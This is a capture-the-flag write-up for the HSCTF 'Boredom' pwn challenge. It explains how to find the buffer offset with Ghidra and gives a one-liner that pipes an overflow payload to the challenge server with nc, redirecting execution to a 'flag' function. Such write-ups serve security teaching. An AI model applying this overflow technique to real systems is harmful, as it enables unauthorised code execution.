# Boredom

Keith is bored and stuck at home. Give him some things to do.

Connect at nc pwn.hsctf.com 5002.

Note, if you're having trouble getting it to work remotely:

* check your offset, the offset is slightly different on the remote server
* the addresses are still the same

## Solution

Disassemble the bin file using ghidra and check the buffer dimension: it is 208 locally (216 to cause a buffer overflow, + 8 byte func_address to call the function) and 200 on server (208 to cause a buffer overflow, + 8 byte func_address to call the function). You'll notice that if you send 220 "a" as input, the program will try to call a function at the address: "0x7f0061616161" (character "a" in ASCII is equal to 0x61 in hex).
So just use the command:

```
python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00'" | nc pwn.hsctf.com 5002
```

This will cause a bufferoverflow and make the program run the function "flag" (address 0x04011d5) to get the flag.txt from the server.
